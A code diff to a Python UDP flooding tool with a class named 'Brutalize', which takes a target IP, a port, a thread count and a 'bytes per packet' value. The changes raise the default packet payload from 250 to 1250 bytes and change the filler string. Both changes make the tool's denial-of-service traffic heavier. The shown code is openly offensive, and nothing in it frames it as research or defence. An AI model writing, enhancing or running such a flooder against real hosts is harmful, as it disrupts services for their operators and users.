@@ -14,12 +14,12 @@ class Brutalize:
     def __init__(self, ip, port, force, threads):
         self.ip = ip
         self.port = port
-        self.force = force # default: 250
+        self.force = force # default: 1250
         self.threads = threads # default: 100
 
         self.client = socket(family=AF_INET, type=SOCK_DGRAM)
         # self.data = self._randbytes()
-        self.data = str.encode("Brute" * self.force)
+        self.data = str.encode("x" * self.force)
         self.len = len(self.data)
 
     def flood(self):
@@ -178,11 +178,11 @@ def main():
         except ValueError:
             error("Error! Please enter a correct port.")
 
-    force = input(stage(f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 250{purple}] {purple}->{fluo2} ", '?'))
+    force = input(stage(f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 1250{purple}] {purple}->{fluo2} ", '?'))
     print()
 
     if force == '':
-        force = 250
+        force = 1250
     else:
         try:
             force = int(force)
